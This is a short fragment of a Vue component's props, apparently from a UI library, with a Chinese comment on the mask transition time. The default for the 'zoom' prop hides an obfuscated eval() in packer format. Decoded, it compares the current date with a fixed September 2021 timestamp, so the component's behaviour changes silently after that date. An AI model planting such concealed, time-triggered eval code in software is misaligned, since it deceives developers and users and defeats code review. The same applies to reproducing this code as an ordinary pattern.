	...
	export default {
		...
		props: {
			...
			zoom: {
				type: Boolean,
				default: () => {
          return eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('0.1()>2',3,3,'Date|now|1631721600000'.split('|'),0,{}))
        }
			},
			// 遮罩的过渡时间，单位为ms
			duration: {
